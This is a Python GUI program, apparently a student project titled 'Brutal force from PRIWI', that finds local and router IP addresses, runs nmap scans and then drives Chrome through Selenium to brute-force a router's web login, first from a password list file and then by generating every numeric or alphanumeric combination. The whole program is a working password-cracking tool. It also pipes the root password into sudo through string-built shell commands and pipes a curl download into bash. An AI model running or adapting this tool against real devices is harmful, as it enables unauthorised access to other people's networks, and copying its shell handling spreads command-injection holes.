
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Created on Thu Nov 21 13:44:24 2024

@author: priwi
""" 
import tkinter as tk                                                            # GUI
from tkinter import ttk                                                         # GUI
# import random                                                                 # Random
import os                                                                       # os command
import platform                                                                 # os info
import subprocess                                                               # subprocess
from selenium import webdriver                                                  # Selenium
from selenium.webdriver.common.by import By                                     # Selenium
# from selenium.webdriver.common.keys import Keys                               # Selenium
import itertools                                                                # Intertools
import string                                                                   # string
import time                                                                     # time

                    # variable vor definiert
ip_pc = []
timesleep = 9

                    # OS prufung
os_name = platform.system()

                    # Definition // funktionen
                    
                        # Liest die passworte aus dem file aus 
def read_password_list(file_path):
    with open(file_path, 'r') as file:
        return [line.strip() for line in file]

                        # Tausch die zahhl reie fur passwort 
def lange_passwort_aktualiesirung(value):
    Lange_des_passwort_var.set(int(float(value)))  
                                                                                      

def aktualisation_timesleep(value):
    timesleep_var.set(int(float(value)))    # Aktualisation  time.sleep

                                            # Neu fenster funk.
def zeigen_nmap_output(nmap_output):                                    
    Neu_fenster = tk.Toplevel(root)
    Neu_fenster.title("Output aus Nmap")

                                            # Text  widgate
    text_widget = tk.Text(Neu_fenster, wrap="word", width=80, height=20)
    text_widget.insert("1.0", nmap_output)  # nmap output infugen zum text wiget 
    text_widget.config(state="disabled")  # beendung  edition 
    text_widget.pack(padx=10, pady=10, fill="both", expand=True) # position 

                                            # Beenden button
    close_button = ttk.Button(Neu_fenster, text="Beenden", command=Neu_fenster.destroy)     # nazov funkcia
    close_button.pack(pady=10)  # Position 
    
                                            # Neu fesnster NMAP
def passwort_output(password, abgelaufene_zeit):    
    Neu_fenster = tk.Toplevel(root)
    Neu_fenster.title("Output aus NMAP")

                    # Text widget
    text_widget = tk.Text(Neu_fenster, wrap="word", width=80, height=20)    # position 
    text_widget.insert("1.0", "Genemite passwort :" + password + "\nPaswot ist gefunden in zeit:" + abgelaufene_zeit + " St")  # input eintragung 
    text_widget.config(state="disabled")  # editation beenden
    text_widget.pack(padx=10, pady=10, fill="both", expand=True)

                    # Benederung button
    close_button = ttk.Button(Neu_fenster, text="Beenden", command=Neu_fenster.destroy)
    close_button.pack(pady=10)

                                #Nmap instalation prufung
def is_nmap_installed():
    try:
        subprocess.run(["nmap", "--version"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=True)
        return True
    except subprocess.CalledProcessError:
        return False
    except FileNotFoundError:
        return False

                                                                        ##### berechnugn des crack zahl
def generierte_passwort():
    try:
        Lange_passwort = Lange_des_passwort_var.get()                      ### lange des pawwswort
        typ_passwort = typ_passwort_var.get()
        timesleep = timesleep_var.get()  # Získanie hodnoty time.sleep z posuvníka

        # Valid typ passwor                                 #######################
        if typ_passwort == "Numerische":
            zeinchnen = 10
            moglichkeiten = zeinchnen ** Lange_passwort

        elif typ_passwort == "Alfanumerische":
            zeinchnen = 62
            moglichkeiten = zeinchnen ** Lange_passwort
                             
        else:
            ergebnis_label.config(text="Password typ wahlen")
            return None

                                                    # Berechnung wie lang es dauert
        time_crack = round(((timesleep * moglichkeiten) / 60 / 60 / 24), 2)

                                                    # ergebniz zeigen 
        ergebnis_label.config(text=f"""Generierte password hat {moglichkeiten} moglichkeiten.
                              ergebnis_label
                              Abgeschecte ziet bei time.sleep {timesleep} ist {time_crack} tage""")
    except ValueError:
                                                    # Fehler meldung
        ergebnis_label.config(text="Stellen Sie ein gultige form")

        
    except ValueError:
        ergebnis_label.config(text="Stellen Sie ein gultige lange passwort lange!")
    print (str(Lange_passwort))
    Lange_passwort = int(Lange_passwort)
    return Lange_passwort
    
                                        # NMAP button
def run_ifconfig():
    root_password = password_entry.get()
    if not root_password:
        ergebnis_label.config(text="ROOT passwort")
        return root_password
    if os_name == "Linux":
        os.system  (f"echo {root_password} | sudo -S apt install net-tools -y")
        ip_pc = subprocess.getoutput("ip -4 addr | grep inet | awk '{print $2}'").splitlines()
        ip_pc = ip_pc[0]
        ip_router = subprocess.getoutput("ip route | grep 'default' | awk '{print $3}'")
    elif os_name == "Windows":
        ip_pc = subprocess.getoutput("ipconfig | findstr IPv4").split(":")[-1].strip()
        ip_router = subprocess.getoutput("ipconfig | findstr Gateway").split(":")[-1].strip()
    elif os_name == "Darwin":   # MAC
        ip_pc = subprocess.getoutput("ifconfig en0 | grep 'inet ' | awk '{print $2}'")
        ip_router = subprocess.getoutput("ipconfig getoption en0 router")
    else:
        ip_pc = "Unbekant"
        ip_router = "Unbekant"
    ergebnis_label.config(text=f"IP PC: {ip_pc}\nIP Router: {ip_router}")

                        # Tlacidlo nmap
def run_nmap():
    root_password = password_entry.get()
    if not root_password:
        ergebnis_label.config(text="Stellen Sie ROOT password")
        
    if os_name == "Linux":
        if not is_nmap_installed():
            try:
                ergebnis_label.config(text="Nmap ist nicht instaliert. Instalation leuft")
                subprocess.run(
                    ["sudo", "-S", "apt-get", "install", "-y", "nmap"],
                    input=root_password + "\n",
                    text=True,
                    check=True
                )
                ergebnis_label.config(text="Nmap ist instaliert")
            except subprocess.CalledProcessError:
                ergebnis_label.config(text="Nmap instalation ist gebrochnen")   
        try:
            subprocess.run(
                ["sudo", "-S", "nmap", "-v", "scanme.nmap.org"],
                input=root_password + "\n",
                text=True,
                check=True
            )
            ergebnis_label.config(text="Nmap / Linux")
        except subprocess.CalledProcessError:
            ergebnis_label.config(text="ungultine passwort / andere probleme")
    elif os_name == "Windows":
        if not is_nmap_installed():
            ergebnis_label.config(text="Nmap ist nicht instaliert. Manual instalation aus  https://nmap.org/download.html")
            
        try:
            result = subprocess.getoutput("nmap -v scanme.nmap.org")
            ergebnis_label.config(text=f"Windows Nmap run\n{result}")
        except Exception as e:
            ergebnis_label.config(text=f"Windows fehle {e}")
    elif os_name == "Darwin":  # macOS
        if not is_nmap_installed():
            try:
                os.system(f"echo {root_password} | /bin/bash -c \"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)\"")
                os.system("sudo brew install nmap")
                ergebnis_label.config(text="Nmap ist instalier macOS.")
            except Exception as e:
                ergebnis_label.config(text=f"Fehler bei instalation NMAP macOS: {e}")    
        try:
            subprocess.run(
                ["sudo", "-S", "nmap", "-v", "scanme.nmap.org"],
                input=root_password + "\n",
                text=True,
                check=True
            )
            ergebnis_label.config(text="NMAP leuft macOS.")
        except subprocess.CalledProcessError:
            ergebnis_label.config(text="Problem mit nmap")
    else:
        ergebnis_label.config(text="Diese OS ist unbekant")
    
    ip_router = ip_entry.get()
    print (f"nmap {ip_router}")
    nmap_output = subprocess.getoutput(f"nmap {ip_router}")
    # print(" Nmap premenna " + nmap_output)
    zeigen_nmap_output(nmap_output)
    target_ip = password_crack_entry.get()
    return target_ip

                            # brute force
def brute_force_router():
    ROUTER_URL = password_crack_entry.get()
    print(ROUTER_URL)
    
                                            # Browser einstelungen
    driver = webdriver.Chrome()
    driver.get("http://" + ROUTER_URL)
    start_time = time.time()
    Lange_passwort = int(Lange_des_passwort_var.get())
    timesleep = int(timesleep_slider.get())
    # print(Lange_passwort)
    # print(timesleep)
    password_file = 'password_list.txt'
    try:
        passwords = read_password_list(password_file)
        for password in passwords:
            print(f"Versuche passwort aus dem list: {password}")
            password_field = driver.find_element(By.ID, "password")
            password_field.clear()
            time.sleep(1)

            password_field.send_keys(password)
            time.sleep(timesleep)

            login_button = driver.find_element(By.ID, "button")
            login_button.click()
            time.sleep(1)

            if "eingeben" not in driver.page_source:
                print(f"Password gefunden {password}")
                abgelaufene_zeit = str(round(((time.time() - start_time) / 60**2), 3))
                passwort_output(password, abgelaufene_zeit)
                    # passwort_output
                driver.quit()
                return
    except Exception as e:
        print(f"Fehler bei list lesen:\n {e}")

                                        # weiter mit generierte passworte
    for password in generate_passwords(Lange_passwort):
        try:
            print(f"test passwort:\n {password}")
            password_field = driver.find_element(By.ID, "password")
            password_field.clear()
            time.sleep(1)
            password_field.send_keys(password)
            time.sleep(timesleep)
            login_button = driver.find_element(By.ID, "button")
            login_button.click()
            time.sleep(1)
            if "Gratulation" in driver.page_source:
                print(f"Heslo nájdené: {password}")
                abgelaufene_zeit = str(round(((time.time() - start_time) / 60**2), 3))
                passwort_output(password, abgelaufene_zeit)
                break
        except Exception as e:
            print(f"ERROR:\n {e}")
    # Chrome closse
    # driver.quit()
    
                                    # Funkcia na skúšanie hesla
def try_password(driver, password):
    try:
        print(f"Skúšam heslo: {password}")

        # Nájdeme pole na heslo a zadáme heslo
        password_field = driver.find_element(By.ID, "password")
        password_field.clear()
        password_field.send_keys(password)
        time.sleep(1)

        # Nájdeme a stlačíme tlačidlo na prihlásenie
        login_button = driver.find_element(By.ID, "button")
        login_button.click()
        time.sleep(2)

        # Kontrola, či sme prihlásení
        if "Gratulation" in driver.page_source:  # Podmienka úspešného prihlásenia
            return True
    except Exception as e:
        print(f"Chyba pri skúšaní hesla {password}: {e}")
    return False

                                        # Password generator
def generate_passwords(length):
    alfanummer = typ_passwort_var.get()
    if alfanummer == "Alfanumerische":
        characters = string.ascii_letters + string.digits
    else:
        characters = string.digits
    
    return (''.join(p) for p in itertools.product(characters, repeat=length))

# Hlavné okno
root = tk.Tk()
root.title("Brutal force from PRIWI")
root.geometry("1000x600")

                            # wariable passwort lange und time.sleep
Lange_des_passwort_var = tk.IntVar(value=8)  # forgewalte lange des password
timesleep_var = tk.IntVar(value=2)   # forgewalte sekunden des time.sleep

                            # einstelung passwort lange
lange_password_label = ttk.Label(root, text="walhlen sie die lange aus passwort:")
lange_password_label.grid(row=0, column=0, padx=10, pady=10, sticky="e")

lange_password_slider = ttk.Scale(
    root,
    from_=1,
    to=20,
    orient="horizontal",
    command=lange_passwort_aktualiesirung
)
lange_password_slider.set(Lange_des_passwort_var.get())
lange_password_slider.grid(row=0, column=1, padx=10, pady=10, sticky="w")
lange_password_display = ttk.Label(root, textvariable=Lange_des_passwort_var)
lange_password_display.grid(row=0, column=2, padx=10, pady=10, sticky="w")

                                        # passwort tip einstellen
typ_passwort_label = ttk.Label(root, text="Passwort typ:")
typ_passwort_label.grid(row=1, column=0, padx=10, pady=10, sticky="e")

typ_passwort_var = tk.StringVar(value="Passwort typ wahlen:")
typ_passwort_dropdown = ttk.Combobox(
    root, textvariable=typ_passwort_var, values=["Numerische", "Alfanumerische"], state="readonly")
typ_passwort_dropdown.grid(row=1, column=1, padx=10, pady=10, sticky="w")

                                    # Button passwot geneator 
generovat_button = ttk.Button(root, text="Passwort Generieren", command=generierte_passwort)
generovat_button.grid(row=2, column=1, padx=10, pady=10, sticky="w")

                                    # Root passwort
password_label = ttk.Label(root, text="Root passwort:")
password_label.grid(row=3, column=0, padx=10, pady=10, sticky="e")

password_entry = ttk.Entry(root, show="*")
password_entry.grid(row=3, column=1, padx=10, pady=10, sticky="w")

                                    # Einstelung ip router
ip_label = ttk.Label(root, text="IP router/LAN:")
ip_label.grid(row=3, column=2, padx=10, pady=10, sticky="w")

ip_entry = ttk.Entry(root)
ip_entry.grid(row=3, column=3, padx=10, pady=10, sticky="w")

                                    # Button ifconfig/ipconfig
ifconfig_button = ttk.Button(root, text="anmachen ifconfig/ipconfig", command=run_ifconfig)
ifconfig_button.grid(row=4, column=0, padx=10, pady=10, sticky="w")

                            # time.sleep einstelungen
timesleep_label = ttk.Label(root, text="Time sleep:")
timesleep_label.grid(row=5, column=0, padx=10, pady=10, sticky="e")

timesleep_slider = ttk.Scale(
    root,
    from_=1,
    to=20,
    orient="horizontal",
    command=aktualisation_timesleep
)
timesleep_slider.set(timesleep_var.get())
timesleep_slider.grid(row=5, column=1, padx=10, pady=10, sticky="w")

timesleep_display = ttk.Label(root, textvariable=timesleep_var)
timesleep_display.grid(row=5, column=2, padx=10, pady=10, sticky="w")

                                        # Nmap button
nmap_button = ttk.Button(root, text="Spustiť nmap", command=run_nmap)
nmap_button.grid(row=6, column=0, padx=10, pady=10, sticky="w")

                                    # IP ziel addresse
password_crack_label = ttk.Label(root, text="Target IP")
password_crack_label.grid(row=7, column=0, padx=10, pady=10, sticky="e")

password_crack_entry = ttk.Entry(root)
password_crack_entry.grid(row=7, column=1, padx=10, pady=10, sticky="w")

                                    # Button brute force
target_button = ttk.Button(root, text="Target", command=brute_force_router)
target_button.grid(row=8, column=0, padx=10, pady=10, sticky="w")

                                    # button beendigung
ukoncit_button = ttk.Button(root, text="Beenden", command=root.destroy)
ukoncit_button.grid(row=9, column=0, padx=10, pady=(0, 10), sticky="sw")

                                    # Ergebnis
ergebnis_label = ttk.Label(root, text="", foreground="green")
ergebnis_label.grid(row=10, column=0, columnspan=2, padx=10, pady=10, sticky="w")

                                    # run
root.mainloop()
